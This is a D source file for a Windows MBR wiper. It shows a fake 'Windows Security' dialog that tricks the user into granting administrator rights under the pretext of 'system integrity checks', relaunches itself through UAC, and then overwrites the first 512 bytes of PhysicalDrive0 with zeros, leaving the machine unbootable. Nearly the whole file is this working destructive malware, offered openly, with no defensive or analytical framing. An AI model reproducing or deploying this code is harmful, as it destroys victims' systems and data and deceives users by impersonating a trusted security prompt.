// Luckily, I already did this in C but just faster. Now its in D and slightly smarter.
// I kinda just translated the syntax

import core.sys.windows.windows;
import core.sys.windows.winbase;
import core.sys.windows.fileapi;
import core.sys.windows.handleapi;
import std.windows.gui;
import std.stdio;
import std.process;

// MBR wipe size
enum MBR_SIZE = 512;

// MBR wiping logic
void overwriteMBR()
{
    HANDLE hDevice = CreateFileA(
        cast(LPCSTR) "\\\\.\\PhysicalDrive0",
        GENERIC_WRITE | GENERIC_READ,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        null,
        OPEN_EXISTING,
        0,
        null
    );
    if (hDevice == INVALID_HANDLE_VALUE)
    {
        return;
    }
    ubyte[MBR_SIZE] mbr = 0;
    DWORD written;
    WriteFile(hDevice, mbr.ptr, MBR_SIZE, &written, null);
    CloseHandle(hDevice);
}

// Relaunches self with UAC prompt (runas verb)
void elevateSelf()
{
    wchar exePath[MAX_PATH];
    GetModuleFileNameW(null, exePath.ptr, MAX_PATH);
    SHELLEXECUTEINFOW sei;
    sei.cbSize = SHELLEXECUTEINFOW.sizeof;
    sei.fMask = SEE_MASK_NOCLOSEPROCESS;
    sei.hwnd = null;
    sei.lpVerb = cast(LPCWSTR) "runas";
    sei.lpFile = exePath.ptr;
    sei.lpParameters = null;
    sei.lpDirectory = null;
    sei.nShow = SW_SHOWNORMAL;
    sei.hInstApp = null;
    sei.lpIDList = null;
    sei.lpClass = null;
    sei.hkeyClass = null;
    sei.dwHotKey = 0;
    sei.hIcon = null;
    sei.hProcess = null;

    if (!ShellExecuteExW(&sei))
    {
        // UAC denied or error
        MessageBoxA(null, "Administrator privilege required. Operation aborted.", "Windows Security", MB_ICONERROR | MB_OK);
    }
}

void main()
{
    // Main window
    auto wnd = new Window();
    wnd.text = "Windows Security";
    wnd.size = Size(420, 210);
    wnd.centerOnScreen();

    // Technical reason label
    auto lbl = new Label(wnd);
    lbl.text = "To complete this operation, Windows requires administrator privileges to access the boot sector (MBR) for system integrity checks and updates.";
    lbl.position = Point(20, 40);
    lbl.size = Size(380, 60);
    lbl.font = Font("Segoe UI", 11);

    // Allow button
    auto btnAllow = new Button(wnd);
    btnAllow.text = "Allow";
    btnAllow.position = Point(160, 120);
    btnAllow.size = Size(100, 32);

    btnAllow.onClick = delegate{
        wnd.close();
        // Try to check if admin, if it ain't, show UAC
        bool isAdmin = false;
        HANDLE hToken;
        if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken))
        {
            TOKEN_ELEVATION elevation;
            DWORD dwSize = TOKEN_ELEVATION.sizeof;
            if (GetTokenInformation(hToken, TokenElevation, &elevation, dwSize, &dwSize))
            {
                isAdmin = elevation.TokenIsElevated != 0;
            }
            CloseHandle(hToken);
        }
        if (!isAdmin)
        {
            elevateSelf();
            return;
        }
        overwriteMBR();
        MessageBoxA(null, "MBR Cleaned. Dont restart btw.", wnd.text.ptr, MB_ICONINFORMATION | MB_OK);
    };

    wnd.showModal();
}
